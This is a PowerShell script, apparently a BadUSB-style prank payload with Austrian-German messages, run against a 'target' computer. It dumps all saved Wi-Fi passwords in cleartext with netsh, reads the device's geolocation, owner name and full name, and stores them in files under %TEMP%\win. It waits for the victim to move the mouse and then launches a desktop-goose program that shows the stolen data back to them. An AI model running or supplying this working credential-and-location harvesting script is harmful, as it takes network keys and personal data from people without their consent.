function Get-wifi{
	try {
	    $wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ SSID=$name;PASS=$pass }} | Format-Table -AutoSize | Out-String }


    # Write Error is just for troubleshooting
    catch {Write-Error "Na sovas" 
    -ErrorAction SilentlyContinue
    } 

$wifiMsg = @"
San des daane wlan passwörta?
$wifiProfiles
"@

$wifiMsg > $env:TEMP\win\Assets\Text\NotepadMessages\wifi.txt
}
Get-wifi

#--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

function Get-GeoLocation{
	try {
	Add-Type -AssemblyName System.Device #Required to access System.Device.Location namespace
	$GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher #Create the required object
	$GeoWatcher.Start() #Begin resolving current locaton

	while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) {
		Start-Sleep -Milliseconds 100 #Wait for discovery.
	}  

	if ($GeoWatcher.Permission -eq 'Denied'){
		Write-Error 'Access Denied for Location Information'
	} else {
		$GeoLocation = $GeoWatcher.Position.Location | Select Latitude,Longitude #Select the relevent results.
$GeoLocation = $GeoLocation -split " "
$Lat = $GeoLocation[0].Substring(11) -replace ".$"
$Lon = $GeoLocation[1].Substring(10) -replace ".$"

$GeoMsg = @"
Heast, i was wos't wohnst:

Längengrad: $Lat
___
Breitengrad: $Lon
___
"@
$GeoMsg > $env:TEMP\win\Assets\Text\NotepadMessages\location.txt
	}
	}
    # Write Error is just for troubleshooting
    catch {Write-Error "No coordinates found" 
    -ErrorAction SilentlyContinue
    } 

}
Get-GeoLocation

#--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


function Get-email {
    
    try {

    $email = (Get-CimInstance CIM_ComputerSystem).PrimaryOwnerName
$emailMsg = @" 
Can I di mit da email anschreiban? 
$email ?
"@


    $emailMsg > $env:TEMP\win\Assets\Text\NotepadMessages\email.txt
    }

# If no email is detected function will return backup message for sapi speak

    # Write Error is just for troubleshooting
    catch {Write-Error "An email was not found" 
    return "No Email Detected"
    -ErrorAction SilentlyContinue
    }        
}

Get-email


#--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

function Get-fullName {

    try {
    $fullName = (Get-LocalUser -Name $env:USERNAME).FullName
    echo "Hi $fullName" > $env:TEMP\win\Assets\Text\NotepadMessages\name.txt
    }
 
 # If no name is detected function will return $env:UserName 

    # Write Error is just for troubleshooting 
    catch {Write-Error "No name was detected" 
    echo "$env:UserName? Seavas oida kämpfa!0" > $env:TEMP\win\Assets\Text\NotepadMessages\name.txt
    -ErrorAction SilentlyContinue
    }

}
Get-fullName

function gemmaburschna {

Add-Type -AssemblyName WindowsBase
Add-Type -AssemblyName PresentationCore

$timeout = 300 # 5 minutes in seconds
$stopTime = (Get-Date).AddSeconds($timeout)

start-process $env:TEMP\win\GooseDesktop.exe

while (1){
    $Lctrl = [Windows.Input.Keyboard]::IsKeyDown([System.Windows.Input.Key]::'LeftCtrl')
    $Rctrl = [Windows.Input.Keyboard]::IsKeyDown([System.Windows.Input.Key]::RightCtrl)

    if ($Rctrl -and $Lctrl) {powershell $env:TEMP\win\aus.bat;exit}
    elseif ((Get-Date) -ge $stopTime) {powershell $env:TEMP\win\aus.bat;exit}
    else {continue}
}
}

function Target-Comes {
Add-Type -AssemblyName System.Windows.Forms
$originalPOS = [System.Windows.Forms.Cursor]::Position.X
$o=New-Object -ComObject WScript.Shell

    while (1) {
        $pauseTime = 3
        if ([Windows.Forms.Cursor]::Position.X -ne $originalPOS){
            break
        }
        else {
            $o.SendKeys("{CAPSLOCK}");Start-Sleep -Seconds $pauseTime
        }
    }
}

Target-Comes
gemmaburschna

